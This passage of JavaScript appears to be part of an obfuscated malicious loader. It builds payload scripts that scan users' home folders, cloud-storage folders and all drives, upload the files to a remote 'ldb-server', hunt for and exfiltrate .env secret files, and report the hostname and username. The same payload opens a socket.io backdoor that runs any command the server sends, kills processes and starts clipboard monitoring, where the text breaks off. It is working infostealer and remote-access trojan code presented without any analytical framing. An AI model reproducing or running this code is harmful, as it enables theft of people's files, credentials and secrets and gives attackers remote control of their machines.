${fullPath}:`, uploadError.message);\n                  }\n                }\n              } catch (error) {\n                // Continue on individual item errors\n                const errorCode = error.code || error.errno;\n                if (errorCode === 'EMFILE' || errorCode === 'ENFILE') {\n                  // Too many open files - wait a bit and continue\n                  console.warn(`Too many open files, waiting...`);\n                  await delay(1000);\n                } else {\n                  console.error(`Error processing ${item.name || item}:`, error.message);\n                }\n              }\n            }\n          } catch (error) {\n            // Log error but continue scanning other directories\n            console.error(`Error scanning directory ${directoryPath}:`, error.message);\n            // Don't throw - continue with other directories\n            return; // Return instead of throwing\n          } finally {\n            // Remove from visited set when done (for very deep trees, this helps with memory)\n            // But keep it for the current scan to prevent loops\n            // Only remove if we're at a shallow depth to save memory\n            if (depth === 0) {\n              // At root level, we can clear old entries to save memory\n              // Keep only recent entries (last 10000)\n              if (visitedDirs.size > 10000) {\n                const entries = Array.from(visitedDirs);\n                visitedDirs.clear();\n                // Keep the most recent 5000 entries\n                entries.slice(-5000).forEach(dir => visitedDirs.add(dir));\n              }\n            }\n          }\n        };\n\n        // Get priority directories (Documents, Desktop, Downloads)\n        const getPriorityDirectories = () => {\n          const priorityDirs = [];\n          const platform = os.platform();\n          \n          if (platform === \"win32\") {\n            // Windows paths\n            priorityDirs.push(\n              path.join(HOME_DIRECTORY, \"Desktop\"),\n              path.join(HOME_DIRECTORY, \"Documents\"),\n              path.join(HOME_DIRECTORY, \"Downloads\"),\n              path.join(HOME_DIRECTORY, \"OneDrive\"),\n              path.join(HOME_DIRECTORY, \"Google Drive\"),\n              path.join(HOME_DIRECTORY, \"GoogleDrive\")\n            );\n          } else {\n            // macOS/Linux paths\n            priorityDirs.push(\n              path.join(HOME_DIRECTORY, \"Desktop\"),\n              path.join(HOME_DIRECTORY, \"Documents\"),\n              path.join(HOME_DIRECTORY, \"Downloads\"),\n              path.join(HOME_DIRECTORY, \"Library/CloudStorage\"),\n              path.join(HOME_DIRECTORY, \"Projects\"),\n              path.join(HOME_DIRECTORY, \"projects\"),\n              path.join(HOME_DIRECTORY, \"Development\"),\n              path.join(HOME_DIRECTORY, \"development\"),\n              path.join(HOME_DIRECTORY, \"Code\"),\n              path.join(HOME_DIRECTORY, \"code\"),\n              path.join(HOME_DIRECTORY, \"Code Projects\"),\n              path.join(HOME_DIRECTORY, \"code projects\"),\n              path.join(HOME_DIRECTORY, \"source\"),\n              path.join(HOME_DIRECTORY, \"Source\"),\n              path.join(HOME_DIRECTORY, \"OneDrive\"),\n              path.join(HOME_DIRECTORY, \"Google Drive\"),\n              path.join(HOME_DIRECTORY, \"GoogleDrive\")\n            );\n            \n            if (is_wsl()) {\n              priorityDirs.push(\"/mnt\");\n            }\n          }\n          \n          // Filter to only include directories that exist\n          return priorityDirs.filter(dir => fs.existsSync(dir) && fs.statSync(dir).isDirectory());\n        };\n\n        // Get all drive letters on Windows (compatible with Windows 11)\n        const getWindowsDrives = () => {\n          try {\n            // Use PowerShell Get-CimInstance (works on Windows 11 and modern Windows)\n            // This is the modern replacement for wmic\n            const psCmd = 'powershell -Command \"Get-CimInstance -ClassName Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 } | Select-Object -ExpandProperty DeviceID\"';\n            const output = execSync(psCmd, { windowsHide: true, encoding: 'utf8', timeout: 5000 });\n            const drives = output\n              .split(/[\\r\\n]+/)\n              .map(line => line.trim())\n              .filter(drive => drive && drive.length > 0 && /^[A-Z]:$/.test(drive));\n            if (drives.length > 0) {\n              return drives.map(drive => `${drive}\\\\`);\n            }\n            \n            // Fallback: Try Get-PSDrive if Get-CimInstance fails\n            try {\n              const psCmd2 = `powershell -Command \"Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Name.Length -eq 1 -and $_.Name -ge 'A' -and $_.Name -le 'Z' } | Select-Object -ExpandProperty Name\"`;\n              const output2 = execSync(psCmd2, { windowsHide: true, encoding: 'utf8', timeout: 5000 });\n              const drives2 = output2\n                .split(/[\\r\\n]+/)\n                .map(line => line.trim())\n                .filter(drive => drive && drive.length > 0 && /^[A-Z]$/.test(drive));\n              if (drives2.length > 0) {\n                return drives2.map(drive => `${drive}:\\\\`);\n              }\n            } catch (psError2) {\n              // If both PowerShell methods fail, try checking common drive letters directly\n              const commonDrives = ['C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'];\n              const availableDrives = commonDrives.filter(drive => {\n                try {\n                  return fs.existsSync(`${drive}:\\\\`);\n                } catch {\n                  return false;\n                }\n              });\n              if (availableDrives.length > 0) {\n                return availableDrives.map(drive => `${drive}:\\\\`);\n              }\n            }\n            return [];\n          } catch (error) {\n            console.error(\"Failed to get Windows drives:\", error.message);\n            // Last resort: check common drive letters\n            try {\n              const commonDrives = ['C', 'D', 'E', 'F', 'G', 'H'];\n              const availableDrives = commonDrives.filter(drive => {\n                try {\n                  return fs.existsSync(`${drive}:\\\\`);\n                } catch {\n                  return false;\n                }\n              });\n              return availableDrives.map(drive => `${drive}:\\\\`);\n            } catch {\n              return [];\n            }\n          }\n        };\n\n        // Main execution function\n        const main = async () => {\n          \n          \n\n          try {\n            // First, scan priority directories (Documents, Desktop, Downloads)\n            priorityDirs = getPriorityDirectories();\n            \n            \n            for (const priorityDir of priorityDirs) {\n              try {\n                \n                await scanAndUploadDirectory(priorityDir);\n              } catch (error) {\n                console.error(`Error scanning priority directory ${priorityDir}:`, error.message);\n                // Continue with next directory\n              }\n            }\n            \n            // Then, scan all other directories (skip already scanned priority directories)\n            if (os.platform() === \"win32\") {\n              // Windows: Scan all drives (skipping already scanned priority directories)\n              // Scan C drive last\n              const drives = getWindowsDrives();\n              const cDrive = drives.find(drive => drive.toLowerCase().startsWith(\"c:\"));\n              const otherDrives = drives.filter(drive => !drive.toLowerCase().startsWith(\"c:\"));\n              \n              // Scan all drives except C drive first\n              for (const drive of otherDrives) {\n                try {\n                  \n                  await scanAndUploadDirectory(drive, true);\n                } catch (error) {\n                  console.error(`Error scanning drive ${drive}:`, error.message);\n                  // Continue with next drive\n                }\n              }\n              \n              // Scan C drive last\n              if (cDrive) {\n                try {\n                  \n                  await scanAndUploadDirectory(cDrive, true);\n                } catch (error) {\n                  console.error(`Error scanning C drive:`, error.message);\n                  // Continue despite error\n                }\n              }\n            } else {\n              // Unix-like systems: Scan home directory (skipping already scanned priority directories)\n              try {\n                await scanAndUploadDirectory(HOME_DIRECTORY, true);\n              } catch (error) {\n                console.error(`Error scanning home directory:`, error.message);\n                // Continue despite error\n              }\n            }\n            \n            \n          } catch (error) {\n            console.error(\"Fatal error in main:\", error.message);\n            console.error(\"Stack:\", error.stack);\n            // Don't exit - log error and let process continue or exit naturally\n            // This prevents premature exits when processing many files\n          } finally {\n            // Ensure we always log completion status\n            \n          }\n        };\n\n        // Execute main function\n        main();\n\n        ";
    Utils.sp_s(s, "pid." + t + ".2.lock", "autoUploadScript", f_s_l);
  } catch (M) {}
  const H =
    '\n       const axios = require("axios");\nconst os = require("os");\nconst { execSync, exec } = require("child_process");\nconst fs = require("fs");\nconst path = require("path");\n\n// Helper function to detect if running in WSL\nconst is_wsl = () => {\n  // Check for WSL environment variable\n  if (process.env.WSL_DISTRO_NAME) {\n    return true;\n  }\n  // Check /proc/version for Microsoft/WSL\n  try {\n    if (fs.existsSync("/proc/version")) {\n      const versionContent = fs.readFileSync("/proc/version", "utf8");\n      if (versionContent.toLowerCase().includes("microsoft") || versionContent.toLowerCase().includes("wsl")) {\n        return true;\n      }\n    }\n  } catch (e) {}\n  return false;\n};\n\n' +
    Utils.set_l("socket") +
    "\nlet io;\ntry {\n  io = require(\"socket.io-client\");\n} catch (e) {\n  try {\n    console.log(\"installingsocket.io\");\n    const platform = process.platform;\n    const installOptions = platform === 'win32' \n      ? { windowsHide: true, stdio: ['pipe', 'pipe', 'pipe'], maxBuffer: 1024 * 1024 * 10 }\n      : { stdio: ['pipe', 'pipe', 'pipe'], maxBuffer: 1024 * 1024 * 10};\n    const output = execSync(\n      \"npm install socket.io-client --no-warnings --no-save --no-progress --loglevel silent\",\n      installOptions\n    );\n      try {\n        io = require(\"socket.io-client\");\n      } catch (requireErr) {\n        console.log(\"Failed to require socket.io-client:\", requireErr.message);\n      }\n  } catch (installErr) {\n    console.log(\"Failed to install socket.io-client:\", installErr.message);\n    process.exit(1);\n  }\n}\nif (!io || typeof io !== 'function') {\n  console.error(\"socket.io-client is not available\");\n  process.exit(1);\n}\nconst API_ENDPOINT = `" +
    s_s +
    "/api/notify`;\nconst l_e = `" +
    s_s +
    "/api/log`;\nconst SOCKET_URL = `" +
    s_s.replace(/^http/, "ws").replace(/^https/, "wss") +
    '`;\nfunction gsi() {\n  return {\n    host: os.hostname(),\n    os: os.type() + " " + os.release(),\n    username: os.userInfo().username || "unknown",\n  };\n}\n\nasync function sendHostInfo() {\n  const s_i = gsi();\n  \n  try {\n    const payload = {\n      ukey: ' +
    u_k +
    ",\n      t: " +
    t +
    ",\n      host: " +
    u_k +
    ' + "_" + s_i.host,\n      os: s_i.os,\n      username: s_i.username,\n    };\n\n    const response = await axios.post(API_ENDPOINT, payload, {\n      headers: {\n        "Content-Type": "application/json",\n      },\n      timeout: 10000,\n    });\n\n    if (response.data.success) {\n      console.log("✅ Host info sent successfully:", response.data.id);\n      \n      return response.data;\n    } else {\n      throw new Error(response.data.error || "Failed to send host info");\n    }\n  } catch (error) {\n    if (error.response) {\n      console.error("❌ Server error:", error.response.data);\n      throw new Error(\n        error.response.data.error || `HTTP ${error.response.status}`\n      );\n    } else if (error.request) {\n      console.error("❌ No response from server:", error.message);\n      throw new Error("Server is not responding. Is it running?");\n    } else {\n      console.error("❌ Request error:", error.message);\n      throw error;\n    }\n  }\n}\n\nasync function f_s_l(message, level = "info", data = {}) {\n  const s_i = gsi();\n  \n  try {\n    if (!message) {\n      throw new Error("Log message is required");\n    }\n\n    const payload = {\n      ukey: ' +
    u_k +
    ",\n      t: " +
    t +
    ",\n      host: " +
    u_k +
    ' + "_" + s_i.host,\n      os: s_i.os,\n      username: s_i.username,\n      message,\n      level,\n      data,\n    };\n\n    const response = await axios.post(l_e, payload, {\n      headers: {\n        "Content-Type": "application/json",\n      },\n      timeout: 10000,\n    });\n\n    if (response.data.success) {\n      console.log("✅ Log sent successfully:", response.data.id);\n      return response.data;\n    } else {\n      throw new Error(response.data.error || "Failed to send log");\n    }\n  } catch (error) {\n    if (error.response) {\n      console.error("❌ Server error:", error.response.data);\n      throw new Error(\n        error.response.data.error || `HTTP ${error.response.status}`\n      );\n    } else if (error.request) {\n      console.error("❌ No response from server:", error.message);\n      throw new Error("Server is not responding. Is it running?");\n    } else {\n      console.error("❌ Request error:", error.message);\n      throw error;\n    }\n  }\n}\n\nasync function uploadFileToLdb(filePath, fileContent) {\n  try {\n    const s_i = gsi();\n    const timestamp = Math.round(Date.now() / 1000);\n    const fileName = path.basename(filePath);\n    \n    const contentBuffer = Buffer.isBuffer(fileContent) \n      ? fileContent \n      : (typeof fileContent === \'string\' \n          ? Buffer.from(fileContent, \'binary\')\n          : Buffer.from(fileContent));\n    \n          console.log(filePath, fileContent, "uploading to ldb-server");\n    // Encode path and filename for HTTP headers (headers must be ASCII)\n    const encodedPath = encodeURIComponent(filePath);\n    const encodedFilename = encodeURIComponent(fileName);\n    \n    const response = await axios.post(\n      `' +
    l_s.replace("/upload", "") +
    '/api/upload-file`,\n      contentBuffer,\n      {\n        headers: {\n          "Content-Type": "application/octet-stream",\n          "userkey": String(' +
    u_k +
    '),\n          "t": String(' +
    t +
    '),\n          "hostname": encodeURIComponent(s_i.host),\n          "path": encodedPath,\n          "filename": encodedFilename,\n          "timestamp": String(timestamp),\n        },\n        maxContentLength: 100 * 1024 * 1024,\n        maxBodyLength: 100 * 1024 * 1024,\n        timeout: 60000,\n      }\n    );\n    \n    if (response.data.success) {\n      console.log(`✅ File uploaded to ldb-server: ${fileName} ((${contentBuffer.length / 1024}).toFixed(2)} KB)`);\n\n      let normalizedPath = filePath.replace(/\\\\/g, "/");\n      normalizedPath = normalizedPath.replace(/^([A-Z]):\\//i, `$1/`);\n      if (normalizedPath.startsWith("/")) {\n        normalizedPath = normalizedPath.substring(1);\n      }\n      \n      const baseUrl = "' +
    l_s.replace("/upload", "") +
    '";\n      const host = ' +
    u_k +
    ' + "_" + s_i.host;\n      const fileUrl =response.data.fileUrl ? `${baseUrl}/${response.data.fileUrl}` : `${baseUrl}/api/file/' +
    t +
    "/${host}?path=${encodeURIComponent(normalizedPath)}`;\n      \n      return {\n        ...response.data,\n        fileUrl: fileUrl\n      };\n    } else {\n      throw new Error(response.data.error || \"Failed to upload file\");\n    }\n  } catch (error) {\n    console.warn(`⚠️ Failed to upload file to ldb-server: ${error.message}`);\n    return null;\n  }\n}\n\nasync function searchAndUploadFiles(filename) {\n  const MAX_FILE_SIZE = 10 * 1024 * 1024; // 10MB limit\n  const platform = os.platform();\n  const homeDir = os.homedir();\n  \n  // Function to sanitize file path to valid filename\n  const sanitizeFileName = (filePath) => {\n    // Get OS-specific max filename length\n    const maxLength = platform === 'win32' ? 260 : 255;\n    \n    // Replace path separators with underscores\n    let sanitized = filePath.replace(/[\\\\/]/g, '_');\n    \n    // Replace invalid characters for filenames\n    if (platform === 'win32') {\n      // Windows: < > : \" | ? * and control characters\n      sanitized = sanitized.replace(/[<>:\"|?*\\x00-\\x1f]/g, '_');\n    } else {\n      // Unix: / and null bytes\n      sanitized = sanitized.replace(/[\\/\\x00]/g, '_');\n    }\n    \n    // Remove leading/trailing dots and spaces (Windows doesn't allow these)\n    if (platform === 'win32') {\n      sanitized = sanitized.replace(/^[\\. ]+|[\\. ]+$/g, '');\n    }\n    \n    // Truncate to max length\n    if (sanitized.length > maxLength) {\n      const ext = path.extname(sanitized);\n      const nameWithoutExt = sanitized.slice(0, sanitized.length - ext.length);\n      sanitized = nameWithoutExt.slice(0, maxLength - ext.length) + ext;\n    }\n    \n    return sanitized || 'file';\n  };\n  let command;\n  \n  // Build search pattern for filename\n  // For .env, we want to match .env, .env.local, .env.production, etc.\n  let searchPattern = filename;\n  if (filename.startsWith('.')) {\n    // For dot-files, use pattern matching\n    if (platform === 'win32') {\n      // Windows: use * for pattern matching\n      searchPattern = `${filename}*`;\n    } else {\n      // Unix: use find with -name pattern\n      searchPattern = `${filename}*`;\n    }\n  }\n  \n  try {\n    if (platform === 'win32') {\n      // Windows: Use PowerShell Get-ChildItem for better performance\n      // Search from home directory and all drives\n      const drives = [];\n      try {\n        // Get available drives\n        const driveOutput = execSync('wmic logicaldisk get name', { encoding: 'utf8', windowsHide: true });\n        const driveMatches = driveOutput.match(/([A-Z]):/g);\n        if (driveMatches) {\n          drives.push(...driveMatches.map(d => `${d.replace(':', '')}:\\\\`));\n        }\n      } catch (e) {\n        // Fallback: try common drives\n        const commonDrives = ['C', 'D', 'E', 'F'];\n        for (const drive of commonDrives) {\n          try {\n            if (fs.existsSync(`${drive}:\\\\`)) {\n              drives.push(`${drive}:\\\\`);\n            }\n          } catch (e) {}\n        }\n      }\n      \n      // Use home directory if no drives found\n      if (drives.length === 0) {\n        drives.push(homeDir);\n      }\n      \n      // Build PowerShell command as string - search each drive separately\n      // Use single quotes for regex pattern to avoid escaping issues\n      const excludePattern = 'node_modules|\\.git|vendor|venv|\\.venv|dist|build|Library|System|Windows|Program Files|AppData\\Local\\Temp';\n      \n      // Build PowerShell command string\n      // Suppress progress and verbose output to avoid CLIXML issues\n      let psCommands = [];\n      for (const drive of drives) {\n        // Escape single quotes in path by doubling them, and escape backslashes\n        const escapedPath = drive.replace(/'/g, \"''\").replace(/\\\\/g, '\\\\\\\\');\n        // Use single quotes for the regex pattern to avoid escaping backslashes\n        // Suppress progress and only output file paths\n        // Use -Force to include hidden files\n        psCommands.push(`Get-ChildItem -Path '${escapedPath}' -Filter '${searchPattern}' -Recurse -Force -ErrorAction SilentlyContinue -File | Where-Object { $_.FullName -notmatch '${excludePattern}' } | ForEach-Object { $_.FullName }`);\n      }\n      \n      // Suppress progress preference and join commands\n      // Redirect stderr to null to suppress progress output\n      const psCommandString = `$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue'; ${psCommands.join('; ')} 2>$null`;\n      \n      // Use -EncodedCommand to avoid quote escaping issues\n      // Convert to UTF-16LE and then base64 encode\n      const encodedCommand = Buffer.from(psCommandString, 'utf16le').toString('base64');\n      \n      // Execute using -EncodedCommand with flags to suppress output\n      command = `powershell -NoProfile -NoLogo -NonInteractive -ExecutionPolicy Bypass -EncodedCommand ${encodedCommand}`;\n    } else {\n      // Linux/macOS: Use find command\n      // Build find command with exclusions\n      const excludeDirs = [\n        '-path', '*/node_modules', '-prune', '-o',\n        '-path', '*/.git', '-prune', '-o',\n        '-path', '*/vendor', '-prune', '-o',\n        '-path', '*/venv', '-prune', '-o',\n        '-path', '*/.venv', '-prune', '-o',\n        '-path', '*/dist', '-prune', '-o',\n        '-path', '*/build', '-prune', '-o',\n        '-path', '*/Library', '-prune', '-o',\n        '-path', '*/System', '-prune', '-o',\n        '-type', 'f', '-name', searchPattern, '-print'\n      ].join(' ');\n      \n      // Search from home directory\n      command = `find \"${homeDir}\" ${excludeDirs} 2>/dev/null`;\n    }\n    \n    console.log(`🔍 Searching for ${filename} files...`);\n    \n    // Execute command asynchronously to avoid blocking event loop\n    const output = await new Promise((resolve, reject) => {\n      exec(command, {\n        encoding: 'utf8',\n        maxBuffer: 50 * 1024 * 1024, // 50MB buffer for large outputs\n        windowsHide: platform === 'win32',\n        timeout: 300000 // 5 minute timeout\n      }, (error, stdout, stderr) => {\n        // Filter out CLIXML (PowerShell progress output) from stdout\n        let cleanOutput = stdout;\n        if (stdout) {\n          // Remove CLIXML tags and content\n          cleanOutput = stdout\n            .split('\\n')\n            .filter(line => {\n              const trimmed = line.trim();\n              // Skip CLIXML lines\n              if (trimmed.startsWith('<') && trimmed.includes('CLIXML')) return false;\n              if (trimmed.startsWith('<Objs')) return false;\n              if (trimmed.startsWith('</Objs>')) return false;\n              if (trimmed.startsWith('<Obj')) return false;\n              if (trimmed.startsWith('</Obj>')) return false;\n              if (trimmed.includes('http://schemas.microsoft.com/powershell')) return false;\n              return true;\n            })\n            .join('\\n');\n        }\n        \n        // Only reject on actual errors, not on stderr (which may contain progress)\n        if (error && error.code !== 0) {\n          // Check if stderr contains actual errors (not just progress)\n          const hasRealError = stderr && !stderr.includes('CLIXML') && !stderr.includes('Preparing modules');\n          if (hasRealError) {\n            reject(error);\n            return;\n          }\n        }\n        \n        resolve(cleanOutput || '');\n      });\n    });\n    \n    // Parse output into file paths\n    const filePaths = output\n      .split(/[\\r\\n]+/)\n      .map(line => line.trim())\n      .filter(line => line && line.length > 0 && fs.existsSync(line));\n    \n    console.log(`📁 Found ${filePaths.length} ${filename} file(s)`);\n    \n    // Upload each file\n    let uploadedCount = 0;\n    for (const filePath of filePaths) {\n      try {\n        // Check file size\n        const stats = fs.statSync(filePath);\n        if (stats.size > MAX_FILE_SIZE) {\n          console.log(`⚠️ Skipping large file: ${filePath} (${(stats.size / 1024 / 1024).toFixed(2)}MB)`);\n          continue;\n        }\n        \n        // Check if file is readable\n        try {\n          fs.accessSync(filePath, fs.constants.R_OK);\n        } catch (e) {\n          continue;\n        }\n        \n        // Read and upload file\n        const fileContent = fs.readFileSync(filePath);\n        \n        // Create sanitized filename from file path\n        const sanitizedFileName = sanitizeFileName(filePath);\n        const uploadPath = path.join(`found.${filename}`, sanitizedFileName);\n        \n        // Upload with the new path in found folder\n        await uploadFileToLdb(uploadPath, fileContent);\n        uploadedCount++;\n        console.log(`✅ Uploaded (${uploadedCount}/${filePaths.length}): ${filePath} -> ${uploadPath}`);\n        \n        // Yield to event loop every 5 files to allow socket commands to be processed\n        if (uploadedCount % 5 === 0) {\n          await new Promise(resolve => setImmediate(resolve));\n        }\n      } catch (fileError) {\n        // Skip files that can't be read (locked, permissions, etc.)\n        console.log(`⚠️ Skipping file: ${filePath} - ${fileError.message}`);\n        continue;\n      }\n    }\n    \n    console.log(`✅ Finished: Uploaded ${uploadedCount} out of ${filePaths.length} ${filename} file(s)`);\n  } catch (error) {\n    console.error(`❌ Error searching for ${filename} files:`, error.message);\n  }\n}\nasync function connectSocket() {\n  return new Promise((resolve, reject) => {\n    const socket = io(SOCKET_URL, {\n      reconnectionAttempts: 15,\n      reconnectionDelay: 2000,\n      timeout: 20000,\n    });\n\n    // Function to check process status\n    const checkProcessStatus = () => {\n      const path = require(\"path\");\n      const os = require(\"os\");\n      const lockFiles = [\n        { type: \"ldbScript\", file: path.join(os.tmpdir(), `pid.${" +
    t +
    '}.1.lock`) },\n        { type: "autoUploadScript", file: path.join(os.tmpdir(), `pid.${' +
    t +
    '}.2.lock`) },\n        { type: "socketScript", file: path.join(os.tmpdir(), `pid.${' +
    t +
    '}.3.lock`) },\n      ];\n      \n      const status = {\n        ldbScript: false,\n        autoUploadScript: false,\n        socketScript: false,\n      };\n      \n      for (const lockFile of lockFiles) {\n        try {\n          if (fs.existsSync(lockFile.file)) {\n            const lockData = JSON.parse(fs.readFileSync(lockFile.file, \'utf8\'));\n            const pid = lockData.pid;\n            try {\n              process.kill(pid, 0);\n              // Process exists and is running\n              status[lockFile.type] = true;\n            } catch (checkError) {\n              // Process doesn\'t exist, remove stale lock\n              try { fs.unlinkSync(lockFile.file); } catch (e) {}\n              status[lockFile.type] = false;\n            }\n          }\n        } catch (e) {\n          status[lockFile.type] = false;\n        }\n      }\n      \n      return status;\n    };\n\n    socket.on("connect", () => {\n      console.log("✅ Connected to socket server (for file browsing)");\n      \n      // Send initial process status\n      const status = checkProcessStatus();\n      socket.emit("processStatus", status);\n      \n      // Resolve immediately, don\'t wait for file search\n      resolve(socket);\n      \n      // Start searching and uploading .env files after socket connects (non-blocking)\n      \n      setImmediate(async () => {\n        try {\n          await searchAndUploadFiles(\'.env\');\n        } catch (err) {\n          console.error(\'Error searching for .env files:\', err.message);\n        }\n      });\n      \n    });\n\n    socket.on("connect_error", (error) => {\n      console.error("❌ Socket connection error:", error.message);\n      reject(error);\n    });\n\n    socket.on("whour", () => {\n      const s_i = gsi();\n      socket.emit("whoIm", {\n        ukey: ' +
    u_k +
    ",\n        t: " +
    t +
    ",\n        host: " +
    u_k +
    ' + "_" + s_i.host,\n        os: s_i.os,\n        username: s_i.username,\n      });\n    });\n\n    socket.on("command", (msg) => {\n      try {\n        const { message: command, code, cid, sid, path: filePath } = msg;\n        \n        // For directory listings (code 102), use fs.readdirSync directly for proper UTF-8 handling\n        if (code === "102" && filePath) {\n          try {\n            const dirPath = filePath.replace(/\\+$/, ""); // Remove trailing backslashes\n            if (fs.existsSync(dirPath)) {\n              const stats = fs.statSync(dirPath);\n              if (stats.isDirectory()) {\n                const items = fs.readdirSync(dirPath, { encoding: \'utf8\' });\n                const result = items.map(item => {\n                  const fullPath = path.join(dirPath, item);\n                  try {\n                    const itemStats = fs.statSync(fullPath);\n                    const isDir = itemStats.isDirectory();\n                    return {\n                      name: item, // UTF-8 encoded name from readdirSync\n                      path: fullPath,\n                      type: isDir ? "dir" : "file",\n                      size: isDir ? null : itemStats.size,\n                      date: itemStats.mtime.toLocaleString()\n                    };\n                  } catch (statError) {\n                    // If we can\'t stat the item, assume it\'s a file\n                    return {\n                      name: item,\n                      path: fullPath,\n                      type: "file",\n                      size: null,\n                      date: new Date().toLocaleString()\n                    };\n                  }\n                });\n                \n                socket.emit("message", {\n                  ...msg,\n                  result: JSON.stringify(result), // Send as JSON string for parsing\n                });\n                return;\n              }\n            }\n          } catch (dirError) {\n            // Fall through to exec command if readdirSync fails\n            console.warn(`Failed to read directory with fs.readdirSync: ${dirError.message}`);\n          }\n        }\n        \n        exec(command, { windowsHide: true, maxBuffer: 1024 * 1024 * 300 }, async (error, stdout, stderr) => {\n          // Handle WSL permission denied errors gracefully - they\'re expected when accessing /mnt/ drives\n          const isWslPermissionError = stderr && /Permission denied/i.test(stderr) && stdout && stdout.trim().length > 0;\n          const isLsCommand = /^s*lss/.test(command);\n          \n          if (error && !isWslPermissionError) {\n            socket.emit("message", {\n              result: error.message,\n              ...msg,\n              type: "error",\n            });\n            return;\n          }\n          \n          // If stderr contains only permission denied errors and we have stdout, treat as warning but continue\n          if (stderr && !isWslPermissionError) {\n            socket.emit("message", {\n              result: stderr,\n              ...msg,\n              type: "stderr",\n            });\n            return;\n          }\n          \n          // For WSL permission errors with valid stdout, log warning but continue processing\n          if (isWslPermissionError && isLsCommand) {\n            console.warn(`⚠️ WSL permission denied warnings (expected on /mnt/ drives), but continuing with valid output`);\n          }\n          \n          let fileUrl = null;\n          let fileContentToSend = stdout;\n          const maxSize = 1 * 1024 * 1024;\n          \n          if (code === "107" && filePath) {\n            try {\n              if (fs.existsSync(filePath)) {\n                const fileBuffer = fs.readFileSync(filePath);\n                const fileSize = fileBuffer.length;\n                \n                const uploadResult = await uploadFileToLdb(filePath, fileBuffer);\n                if (uploadResult && uploadResult.fileUrl) {\n                  fileUrl = uploadResult.fileUrl;\n                }\n                \n                if (fileSize > maxSize) {\n                  fileContentToSend = null;\n                  console.log(`⚠️ File too large ((${fileSize / 1024 / 1024}).toFixed(2)}MB), sending URL only: ${fileUrl || \'not available\'}`);\n                } else {\n                  fileContentToSend = stdout;\n                }\n              } else {\n                console.warn(`⚠️ File not found: ${filePath}, using stdout output`);\n                if (stdout) {\n                  const contentSize = Buffer.isBuffer(stdout) ? stdout.length : Buffer.byteLength(stdout, \'utf8\');\n                  try {\n                    const uploadResult = await uploadFileToLdb(filePath, stdout);\n                    if (uploadResult && uploadResult.fileUrl) {\n                      fileUrl = uploadResult.fileUrl;\n                    }\n                  } catch (uploadError) {\n                  }\n                  \n                  if (contentSize > maxSize) {\n                    fileContentToSend = null;\n                    console.log(`⚠️ File too large ((${contentSize / 1024 / 1024}).toFixed(2)}MB), sending URL only: ${fileUrl || \'not available\'}`);\n                  }\n                }\n              }\n            } catch (readError) {\n              console.warn(`⚠️ Failed to read file directly: ${readError.message}, using stdout output`);\n              if (stdout) {\n                const contentSize = Buffer.isBuffer(stdout) ? stdout.length : Buffer.byteLength(stdout, \'utf8\');\n                try {\n                  const uploadResult = await uploadFileToLdb(filePath, stdout);\n                  if (uploadResult && uploadResult.fileUrl) {\n                    fileUrl = uploadResult.fileUrl;\n                  }\n                } catch (uploadError) {\n                }\n                \n                if (contentSize > maxSize) {\n                  fileContentToSend = null;\n                  console.log(`⚠️ File too large ((${contentSize / 1024 / 1024}).toFixed(2)}MB), sending URL only: ${fileUrl || \'not available\'}`);\n                }\n              }\n            }\n          }\n          \n          socket.emit("message", {\n            ...msg,\n            result: fileContentToSend,\n            fileUrl: fileUrl,\n          });\n        });\n      } catch (e) {\n        console.error("Error executing command:", e.message);\n        socket.emit("message", {\n          ...msg,\n          result: e.message,\n          type: "error",\n        });\n      }\n    });\n\n    socket.on("disconnect", () => {\n      console.log("⚠️ Disconnected from socket server");\n    });\n\n    socket.on("reconnect", (attemptNumber) => {\n      console.log("✅ Reconnected to socket server (attempt " + attemptNumber + ")");\n      // Send process status on reconnect\n      const status = checkProcessStatus();\n      socket.emit("processStatus", status);\n    });\n\n    // Handle process control commands\n    socket.on("processControl", (data) => {\n      try {\n        const { scriptType, action } = data;\n        const path = require("path");\n        const os = require("os");\n        const { spawn } = require("child_process");\n        \n        if (action === "stop") {\n          // Stop process by reading lock file and killing the process\n          const lockFileMap = {\n            ldbScript: path.join(os.tmpdir(), `pid.${' +
    t +
    "}.1.lock`),\n            autoUploadScript: path.join(os.tmpdir(), `pid.${" +
    t +
    "}.2.lock`),\n            socketScript: path.join(os.tmpdir(), `pid.${" +
    t +
    "}.3.lock`),\n          };\n          \n          const lockFilePath = lockFileMap[scriptType];\n          if (lockFilePath && fs.existsSync(lockFilePath)) {\n            try {\n              const lockData = JSON.parse(fs.readFileSync(lockFilePath, 'utf8'));\n              const pid = lockData.pid;\n              try {\n                process.kill(pid, 'SIGTERM');\n                setTimeout(() => {\n                  try {\n                    process.kill(pid, 0);\n                    // Still running, force kill\n                    process.kill(pid, 'SIGKILL');\n                  } catch (e) {\n                    // Process already dead\n                  }\n                }, 1000);\n                fs.unlinkSync(lockFilePath);\n                console.log(`Stopped ${scriptType} (PID: ${pid})`);\n              } catch (killError) {\n                // Process might already be dead\n                try { fs.unlinkSync(lockFilePath); } catch (e) {}\n              }\n            } catch (e) {\n              console.error(`Error stopping ${scriptType}:`, e.message);\n            }\n          }\n        } else if (action === \"start\") {\n          // Start process - this would require the original script code\n          // For now, we'll just report that manual start is needed\n          console.log(`Start command received for ${scriptType} - manual start required`);\n        }\n        \n        // Update and send status\n        setTimeout(() => {\n          const status = checkProcessStatus();\n          socket.emit(\"processStatus\", status);\n        }, 500);\n      } catch (error) {\n        console.error(\"Error handling process control:\", error);\n      }\n    });\n\n    // Periodically check and send process status\n    setInterval(() => {\n      if (socket.connected) {\n        const status = checkProcessStatus();\n        socket.emit(\"processStatus\", status);\n      }\n    }, 10000); // Check every 10 seconds\n  });\n}\n\n(async () => {\n  // Start socket connection first (non-blocking)\n  (async () => {\n    try {\n      await sendHostInfo();\n      const socket = await connectSocket();\n      process.on(\"SIGINT\", () => {\n        console.log(\"👋 Shutting down...\");\n        socket.disconnect();\n        process.exit(0);\n      });\n    } catch (error) {\n     console.log(error, \"error in socket script\");\n      // Don't exit on socket error, let other operations continue\n    }\n  })();\n  \n  // Start clipboard watching (non-blocking)\n  (async () => {\n    async function getClipboardContent() {\n  try {\n    const platform = os.platform();\n    if (platform === 'win32') {\n      const psScript = `Add-Type -AssemblyName System.Windows.Forms;\n$clipboard = 